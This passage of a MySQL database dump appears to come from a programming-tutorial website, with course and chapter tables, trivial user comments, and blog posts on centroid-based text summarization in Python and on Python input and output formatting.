Statements','',5,'Looping-Statements',NULL,NULL),(18,5,'Lists','',5,'Lists',NULL,NULL),(19,6,'Strings','',5,'Strings',NULL,NULL),(20,7,'File Operations','',5,'File-Operations',NULL,NULL),(21,1,'Language Basics','',6,'Language-Basics','','Language_Basics_in_Java.jpg'),(22,2,'Operators','',6,'Operators','','Operators_in_Java.jpg'),(23,3,'Branching Statements','',6,'Branching-Statements',NULL,NULL),(24,4,'Looping Statements','',6,'Looping-Statements',NULL,NULL),(25,5,'Arrays','',6,'Arrays',NULL,NULL),(26,1,'Digit Problems','<p>In this Chapter I have explained how to work with Digits of an Integer. Integer is not subscriptable, so how could we access digit by&nbsp; digit of a number. For Example to do Reverse the Digits, Sum of Digits and so on.</p>',7,'problem-solving-in-digits','',NULL),(27,2,'Python Program for Guessing Game','<p style=\"text-align: justify; \">\"You may play a game level by level, here you will develop a game level by level to understand the fundamentals of programming\"</p><p style=\"text-align: justify; \">The ability to build logic is essential for learning any programming language. We can improve our logic building skills through practice, so this chapter provides 7 guessing game problems and solutions. Problem 1 begins with level 1, the easiest guessing game, and each subsequent problem is more difficult than the previous one.&nbsp;Problem 7 is a complete Guessing game that requires conditional, looping, sequence types, and file concepts to solve. Have fun while learning.</p>',7,'python-program-for-guessing-game','',NULL),(28,3,'Factors Program in Python','',7,'factors-program-in-python','',NULL),(29,6,'Strings','',6,'strings-20a0','',''),(30,4,'Scenario Based Problems in Python','',7,'scenario-based-problems-in-python','',''),(31,1,'Basic Statistics Programs','',8,'basic-statistics-programs','',''),(32,2,'Searching Problems','',8,'searching-problems','','');
/*!40000 ALTER TABLE `example_app_chapter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_comment`
--

DROP TABLE IF EXISTS `example_app_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_comment` (
  `id` int NOT NULL AUTO_INCREMENT,
  `comment` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `commented_by_id` int DEFAULT NULL,
  `post_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `example_app_comment_commented_by_id_b0ccd7dc` (`commented_by_id`),
  KEY `example_app_comment_post_id_bd8a2f5b` (`post_id`)
) ENGINE=MyISAM AUTO_INCREMENT=1121 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_comment`
--

LOCK TABLES `example_app_comment` WRITE;
/*!40000 ALTER TABLE `example_app_comment` DISABLE KEYS */;
/*!40000 ALTER TABLE `example_app_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_comment_program`
--

DROP TABLE IF EXISTS `example_app_comment_program`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_comment_program` (
  `id` int NOT NULL AUTO_INCREMENT,
  `comment` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `commented_by_id` int NOT NULL,
  `program_id` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16893 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_comment_program`
--

LOCK TABLES `example_app_comment_program` WRITE;
/*!40000 ALTER TABLE `example_app_comment_program` DISABLE KEYS */;
INSERT INTO `example_app_comment_program` VALUES (16860,'print(\"Hello World\")',258,868),(16861,'Hello',2,857),(16862,'h',2,857),(16863,'.',380,103),(16864,'.',379,60),(16865,'.',380,104),(16866,'given result is wrong',381,100),(16867,'.',380,105),(16868,'.',381,101),(16869,',',380,106),(16870,'.',380,107),(16871,'easy',381,102),(16872,'.',380,109),(16873,'.',384,101),(16874,'nil',386,105),(16875,'.',381,104),(16876,'.',381,105),(16877,'.',380,111),(16878,'.',379,100),(16879,'good',387,100),(16880,'`',381,106),(16881,'.',379,101),(16882,'Good',387,101),(16883,'.',380,114),(16884,'easy',387,102),(16885,'Easy',387,103),(16886,'good',387,104),(16887,'Easy',387,105),(16888,'Easy',387,106),(16889,'Easy',387,108),(16890,'easy',387,109),(16891,'Easy',387,110),(16892,'easy',387,111);
/*!40000 ALTER TABLE `example_app_comment_program` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_course`
--

DROP TABLE IF EXISTS `example_app_course`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_course` (
  `id` int NOT NULL AUTO_INCREMENT,
  `course_title` varchar(30) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `course_description` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `reference` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `slug` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `featured_image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `author` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `slug` (`slug`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_course`
--

LOCK TABLES `example_app_course` WRITE;
/*!40000 ALTER TABLE `example_app_course` DISABLE KEYS */;
INSERT INTO `example_app_course` VALUES (3,'C Programming','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Learn C Programming basics and Problem solving with C. This Course includes C Programming Examples with solutions and explanations.More than 200 C Programming Examples are given. Beginners can learn Logic Building using C Programming with these examples. Happy Learning.</span><br></p>','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Learning the basic syntax of any programming language is an easy one.But, it is not sufficient to become a programmer or coder, ability to build logic for the problem is most important. This Platform includes complete coded examples with explanation, which is more enough to learn programming in C. Learn the basic syntax of C from&nbsp;</span><a href=\"https://www.w3schools.in/c-tutorial/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">w3schools</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and&nbsp;</span><a href=\"https://www.javatpoint.com/c-programming-language-tutorial\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">javatpoint</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and logical skills through decode school examples. Today you need not to install C Compiler in your machine, instead Practice C Code with&nbsp;</span><a href=\"https://www.codechef.com/ide\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Online Compiler</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">.</span><br></p>','C-Programming','banner1.jpg','P N Ramesh'),(4,'Logic Building in C','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">This course includes programming examples with solutions, Algorithms and video tutorials to learn problem solving. Problem solving techniques helps you in cracking competitive programming contests.</span><br></p>','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Learning the basic syntax of any programming language is an easy one.But, it is not sufficient to become a programmer or coder, ability to build logic for the problem is more important. This Platform includes complete coded examples with explanation, which is more enough to learn programming in C. Learn the basic syntax of C from&nbsp;</span><a href=\"https://www.w3schools.in/c-tutorial/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">w3schools</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and&nbsp;</span><a href=\"https://www.javatpoint.com/c-programming-language-tutorial\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">javatpoint</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and logical skills through decode school examples. Today you need not to install C Compiler in your machine, instead Practice C Code with&nbsp;</span><a href=\"https://www.codechef.com/ide\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Online Compilers</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">.</span><br></p>','Problem-Solving','banner1_CDmff5o.jpg','P N Ramesh'),(5,'Python Programming','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Python Programming is one of the trending programming language, which is used in almost every filed of Information Technology. Python is used in Research and development of many trending technologies like Data Science, Internet of things and Machine Learning. Python Programming is easiest Language to Learn and provides high productivity in software development. This Section is built with Python Programming examples as a reference for Learners and Developers. All the Programming examples included are explained in detail.</span><br></p>','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Programming is an art, to reach excellence in programming you have to practice more and you have to play more with programming. you can refer python programming examples in this section during your practise and few examples provide you a 360 degree understanding of python programming basics. After Learning the python programming basics, learn&nbsp;</span><a href=\"https://www.python-course.eu/python3_object_oriented_programming.php\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">OOPs using Python</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">. Python Programming is also used in Web Programming. Learn&nbsp;</span><a href=\"https://www.djangoproject.com/start/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Django Python Framework</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;for Web devploment. Official Python Web Sites To Learn:&nbsp;</span><a href=\"https://docs.python.org/3/tutorial/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Python docs</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;To download Libraries:&nbsp;</span><a href=\"https://pypi.org/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">PyPI</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">.</span><br></p>','Python-Programming','banner_python.jpg','P N Ramesh'),(6,'Java Programming','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Java is an Object Oriented Programming, Multi Threaded and highly Secured Language that enable developers to develop all kind of applications like Console, Windows, Web and Mobile Applications.</span><br></p>','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Java is originally developed by Sun Micro Systems and now it is owned by Oracle Corporation. The Official Website to learn Java Programming is&nbsp;</span><a href=\"https://docs.oracle.com/javase/tutorial/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">The Java Tutorials by Oracle.</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and to download java development kit JDK&nbsp;</span><a href=\"https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Latest jdk version.</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">&nbsp;and&nbsp;</span><a href=\"https://www.java.com/en/download/\" style=\"background-color: rgb(255, 255, 255); font-size: 18px; text-align: justify;\">Latest jdk version through java.com</a><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">.</span><br></p>','Java-Programming','java_banner.png','P N Ramesh'),(7,'Python Logic Building','','','python-logic-building','python.png','P N Ramesh'),(8,'Problem Solving using Java','','','problem-solving-using-java','Screenshot_1.png','P N Ramesh');
/*!40000 ALTER TABLE `example_app_course` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_post`
--

DROP TABLE IF EXISTS `example_app_post`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_post` (
  `id` int NOT NULL AUTO_INCREMENT,
  `post_title` varchar(225) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `slug` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `post_body` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `posted_on` datetime(6) NOT NULL,
  `blog_id` int NOT NULL,
  `featured_image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `slug` (`slug`),
  KEY `example_app_post_blog_id_bb9c3170` (`blog_id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_post`
--

LOCK TABLES `example_app_post` WRITE;
/*!40000 ALTER TABLE `example_app_post` DISABLE KEYS */;
INSERT INTO `example_app_post` VALUES (1,'Centroid based Text summarization in Python','Centroid-based-Text-summarization-in-Python','<h3 style=\"text-align: justify; margin: 2ex 0px 1ex; font-size: 13.44px; font-family: Verdana, Arial, Helvetica, sans-serif;\"><b style=\"\">Introduction</b></h3><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">It is an Extractive summarization, which extracts important words from document(s) to form a summary. Centroid-based summarization works as identifying the most central sentences in multiple documents that give the necessary and sufficient amount of information related to the main theme of document(s). A common way of identifying the central sentences is to represent the sentences in vector space.</span></p><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">Centrality of sentence is always defined in terms of centrality of word.&nbsp;<a href=\"http://www.tfidf.com/\" style=\"color: rgb(102, 102, 102);\">TF X IDF scores&nbsp;</a>are used to measure the centrality of words. Here, words that have TF X IDF scores above a predefined cosine threshold are centroid of cluster.</span></p><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">In centroid based summarization, the sentences which have more words from centroid of cluster are considered as central sentences. Finally, those sentences are produced as summary of multiple documents.</span></p><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">Centroid based summarization is introduced by Radev, Blair-Goldensohn, and Zhang.</span></p><h3 style=\"margin: 2ex 0px 1ex; font-size: 13.44px; font-family: Verdana, Arial, Helvetica, sans-serif;\"><span style=\"font-weight: bold;\">Implementation of Text Summarization in Python</span></h3><h3 style=\"margin: 2ex 0px 1ex; font-size: 13.44px; font-family: Verdana, Arial, Helvetica, sans-serif;\"><br></h3><pre class=\"code\" style=\"overflow: hidden; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);\">\r\n <script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\r\n					<ins class=\"adsbygoogle\"\r\n     						style=\"display:block; text-align:center;\"\r\n     						data-ad-layout=\"in-article\"\r\n     						data-ad-format=\"fluid\"\r\n     						data-ad-client=\"ca-pub-5181933327362047\"\r\n    		 				data-ad-slot=\"2832571695\">\r\n    		 			</ins>\r\n					<script>\r\n     						(adsbygoogle = window.adsbygoogle || []).push({});\r\n					</script>\r\n	    \r\n<code>\r\nfrom os import listdir\r\nimport string\r\nimport math\r\n\r\n\"\"\"Method to calculate Inverse Document Frequency Score\"\"\"\r\ndef calculate_idf(word):\r\n    files = [f for f in listdir(\"E:\\Works\\Products\\doc\") ]  #Specify the directory where the documents located\r\n    count,wcount=2,1    \r\n    for file1 in files:\r\n        file=open(\"E:\\Works\\Products\\doc\\\\\" +file1,\'r\')     #Specify the directory where the documents located\r\n        page=file.read()\r\n        if(word in page):\r\n            wcount+=1\r\n        count+=1\r\n    idf=count/wcount\r\n    \r\n    return math.log(idf,10)\r\n\r\n\"\"\"Method to calculate Centroid Score of sentences\"\"\"\r\ndef calculate_centroid(sentences):\r\n    \r\n    \"\"\"\"Compute tf X idf score for each word\"\"\"\r\n    tfidf=dict()\r\n    for sentence in sentences:\r\n        words=sentence.split()\r\n        for word in words:\r\n            if word in tfidf:\r\n                tfidf[word]+=calculate_idf(word)\r\n            else:\r\n                tfidf[word]=calculate_idf(word)\r\n\r\n    \"\"\"Construct the centroid of Cluster\r\n    By taking the words that are above the threshold\"\"\"\r\n\r\n    centroid=dict()\r\n    threshold=0.7\r\n    for word in tfidf:\r\n        if(tfidf[word]&gt;threshold):\r\n            centroid[word]=tfidf[word]\r\n        else:\r\n            centroid[word]=0\r\n\r\n    \"\"\"Compute the Score for Sentences\"\"\"\r\n    senctence_score=list()\r\n    counter=0\r\n    for sentence in sentences:\r\n        senctence_score.append(0)\r\n        words=sentence.split()\r\n        for word in words:\r\n            senctence_score[counter]+=centroid[word]\r\n        \r\n        counter=counter+1\r\n    return senctence_score\r\n\r\n\r\n\"\"\"Splitting Documents as sentences\"\"\"\r\nfiles = [f for f in listdir(\"E:\\Works\\Products\\doc\") ]\r\npage=\"\"\r\nfor file1 in files:\r\n    file=open(\"E:\\Works\\Products\\doc\\\\\" +file1,\'r\')\r\n    page+=file.read()\r\n    file.close()\r\nsentences=page.split(\".\")\r\nsenctence_score=calculate_centroid(sentences)\r\n    \r\n\r\n\"\"\"Printing Sentences which has more central words\"\"\"\r\nfor i in range(len(sentences)):\r\n    if(senctence_score[i]&gt;15):\r\n        print(sentences[i])\r\n</code>\r\n</pre>\r\n <script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\r\n					<ins class=\"adsbygoogle\"\r\n     						style=\"display:block; text-align:center;\"\r\n     						data-ad-layout=\"in-article\"\r\n     						data-ad-format=\"fluid\"\r\n     						data-ad-client=\"ca-pub-5181933327362047\"\r\n    		 				data-ad-slot=\"2832571695\">\r\n    		 			</ins>\r\n					<script>\r\n     						(adsbygoogle = window.adsbygoogle || []).push({});\r\n					</script>\r\n	    \r\n<h3 style=\"margin: 2ex 0px 1ex; font-size: 13.44px; font-family: Verdana, Arial, Helvetica, sans-serif;\"><span style=\"font-weight: bold;\">Implementation Details</span></h3><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">I have implemented the Centroid based text summarization in python, the above-mentioned code is purely for the text summarization which contains method for calculating IDF score of every word and centroid score of every sentence. To understand Python basics refer&nbsp;<a href=\"http://www.decodeschool.com/Python-Programming/Examples\" style=\"color: rgb(102, 102, 102);\">Python Programming Examples</a></span></p><p style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.44px;\"><span style=\"font-size: large; font-family: &quot;times new roman&quot;, times;\">Centroid score of every sentence is calculated by TF X IDF score of words in the sentence. To easily understand the algorithm of centroid based text summarization, preprocessing techniques like&nbsp;<a href=\"https://www.geeksforgeeks.org/removing-stop-words-nltk-python/\" style=\"color: rgb(102, 102, 102);\">stop word removal</a>&nbsp;and stemming are not given in the above implementation</span></p>','2020-06-02 14:29:19.232093',1,'banner_python_s0ggHuB.jpg'),(2,'Input and Output in Python','input-and-output-in-python','<p></p><h2 style=\"text-align: justify; \">Input and Output in Python - Part I (Output and Formatting)</h2>\r\n\r\n<p style=\"text-align: justify;\">Programming learning is not about learning a programming language\'s syntax. If you thoroughly read any materials, such as books or tutorials, then programming is not meant to be learned. Programming is all about constructing logic, syntax only plays a 5 percent role.</p>\r\n\r\n<p style=\"text-align: justify;\">If you are good in the building of logic then in just a few days you can learn any programming language. My posts will concentrate on both constructing logic and mapping the syntax to the logic created.</p><p>\r\n\r\n</p><p style=\"text-align: justify;\">Programming is a series of statements written to perform any function on a computer, two essential operations in any function are called input and output display. Typically we learn programming with a console application which is an application based on text. In console application inputs get from keyboard and outputs displayed to the monitor. The figure below indicates Console Use.</p><p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/0a8ba478-b0e4-4d09-9c84-51b8d257c7e3.jpg\" style=\"width: 100%;\"><br></p>\r\n\r\n               \r\n<p style=\"text-align: justify;\">Inputs and outputs are available in different formats such as series, numbers, whole numbers and decimal numbers etc. In this review, we dive deep into the dynamics of Input and Output Statements.</p>\r\n\r\n\r\n<h3 style=\"text-align: justify;\">Example 1: Printing the \"Hello World\"</h3>\r\n\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello world\")</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n\r\n<p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/828cc5ea-88a8-468c-ac13-a725b52f77d8.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">The above statement or command shows the \"Hello World\" string in the console. Yeah, printing is the function statement used to display something in the console.</p>\r\n\r\n<h3 style=\"text-align: justify;\">Example 2 : Simple Input and Output</h3>\r\n\r\n<p style=\"text-align: justify;\">When you want a string to be entered by the user and the machine to display the same.</p>\r\n\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">text = input(\"Enter your Name:\") </span></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">  </span></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(text)</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n\r\n\r\n<p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/d7b68cef-620b-4e25-9ad9-45681643a95c.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">The first line shows the \"Enter Your Name\" message and reads the user\'s input and saves the memory, the location of the memory being referenced by the name (variable) named text.  The second statement prints the string referenced by the name text.</p>\r\n\r\n<p style=\"text-align: justify;\">You will remember that in Example 1, Hello World is prefixed and suffixed with double quotes inside the print statement, but in Example 2 text is not protected by double quotes, since we want to print content inside text and not text.</p>\r\n\r\n<p style=\"text-align: justify;\">Yeah, in this learning process we concentrate intensely on output statements and subsequent input statements for a few miles.</p><p>\r\n\r\n\r\n</p><h3 style=\"text-align: justify;\">print Statement:</h3>\r\n\r\n<p style=\"text-align: justify;\">How to print a varible value with additional pharase, such as \"Entered Name is:\"? We can do that in many ways.</p>\r\n\r\n<h3 style=\"text-align: justify;\">Example 3:</h3>\r\n\r\n<p style=\"text-align: justify;\">First option is we can use string concatenation like:</p>\r\n\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">name = input(\"Enter your Name:\")</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Entered Name is: \" + name)</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n<p>           \r\n\r\n</p><p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/622a3f7a-46fd-4eb3-ae66-f000d8f3ef47.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">This approach generates an exception if the variable has numbers (integer or float)\r\n</p>\r\n\r\n <script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\r\n					<ins class=\"adsbygoogle\"\r\n     						style=\"display:block; text-align:center;\"\r\n     						data-ad-layout=\"in-article\"\r\n     						data-ad-format=\"fluid\"\r\n     						data-ad-client=\"ca-pub-5181933327362047\"\r\n    		 				data-ad-slot=\"2832571695\">\r\n    		 			</ins>\r\n					<script>\r\n     						(adsbygoogle = window.adsbygoogle || []).push({});\r\n					</script>\r\n	    \r\n<h3 style=\"text-align: justify;\">\r\nExample 4:\r\n</h3>\r\n<p style=\"text-align: justify;\">\r\nsecond option is you can pass the pharase and varible as two arguments to print funtion\r\n</p>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">name = input(\"Enter your Name:\")</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Entered Name is: \", name)</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"white-space: pre;\"><br></span></div></code></pre>\r\n                \r\n \r\n<p style=\"text-align: justify;\">\r\nHowever, formatted print is suitable to print outputs in different formats.\r\n</p>\r\n \r\n\r\n<h3 style=\"text-align: justify;\">Formatted print statement</h3>\r\n\r\n<h3 style=\"text-align: justify;\">Example 5:</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">name = input(\"Enter your Name:\")</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Entered Name is: {} \".format(name))</span></div>\r\n<div style=\"text-align: justify;\"><span style=\"white-space: pre;\"><br></span></div></code></pre>\r\n\r\n \r\n<p style=\"text-align: justify;\">\r\nThe above example shows the basic formatting, and the following examples show different formatted printing scopes.\r\n</p>\r\n<h3 style=\"text-align: justify;\">\r\nExample 6:\r\n</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">fname = input(\"Enter First Name:\") </span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">lname = input(\"Enter Second Name:\")</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"First Name: {} \\nLast Name: {}\".format(fname,lname))</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n\r\n\r\n \r\n\r\n<p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/afe1d884-c1b8-427a-a277-5358dd61d17b.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">two {} (set brackets) are reserved for the value of variables fname and lname.\r\n</p><p style=\"text-align: justify;\">\r\n\\n prints the new line in the console. using this format function, we could do right and center alignment the text in the specified length\r\n</p>\r\n<p style=\"text-align: justify;\">\r\nLike \\n there are several other escape sequences, the follwing table illustrates the same.\r\n</p>\r\n<h3 style=\"text-align: justify;\">\r\nExample 7:</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello\\tRamesh\")                 #             \\t leaves a tab space </span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello \\\' Ramesh\")                #             \\\' prints single quotes( \' )</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello \\\" Ramesh\")                #             \\\" prints double quotes( \" )</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello \\\\ Ramesh\")                #             \\\\ prints backslash ( \\ )</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello\\bRamesh\")                  #             \\b backspace (it deletes \'o\') </span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"Hello and welcome\\rRamesh\")      #             \\r carriage return, cursor moves to   </span></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">                                                                                                                       starting position of line</span></div>\r\nprint(\"Hello\\vRamesh\")  		#             \\v Vertical Space\r\n<div style=\"text-align: justify;\"><span style=\"white-space: pre;\"><br></span></div></code></pre><div style=\"text-align: justify;\">Note : # denotes comments, comments doesn\'t execute by the computer</div><p></p><p>\r\n\r\n</p><h3>\r\n</h3><h3 style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/51ef1ee0-54d3-4c4a-8509-d10c736500bb.jpg\" style=\"width: 100%;\"><br></h3><h3 style=\"text-align: justify;\">Example 8:</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:&gt;10}\".format(\"Ramesh\"))             #Right Alignment </span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:^10}\".format(\"Ramesh\"))             #Center Alignment</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:10}\".format(\"Ramesh\"))               #left Alignment</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\'{:_&lt;10}\'.format(\'Ramesh\'))             #left alignment and fill</span></div><div style=\"text-align: justify;\"></div>\r\n<div 